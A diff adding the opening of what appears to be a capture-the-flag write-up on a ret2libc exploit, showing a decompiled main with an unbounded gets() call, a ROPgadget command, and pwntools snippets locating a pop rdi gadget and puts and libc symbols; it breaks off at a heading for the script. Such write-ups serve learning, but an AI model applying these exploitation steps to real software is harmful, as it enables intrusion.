@@ -1,3 +1,36 @@
+## The Beginning
+This is a classic ret2lib binary exploitation problem. Source code is not given so we need to use Cutter to see the code.
+
+The ```main``` looks like this:       
+
+```
+undefined8 main(void)
+{
+    char *s;
+    
+    init();
+    puts("Hello");
+    gets(&s);
+    return 0;
+    }
+```
+
+## Get gadgets
+Use ```ROPgadget --binary rop | grep "ret"``` to get ```ret``` address ```0x40048e```        
+
+## Or automatically get them through pwn
+Like this:
+```
+poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
+```
+## Find plt address for 
+```
+_libc_start_main_ptr = elf.symbols['__libc_start_main']
+puts = elf.symbols['puts']
+main = elf.symbols["main"]
+
+```
+
 ## Original Script
 
 ```
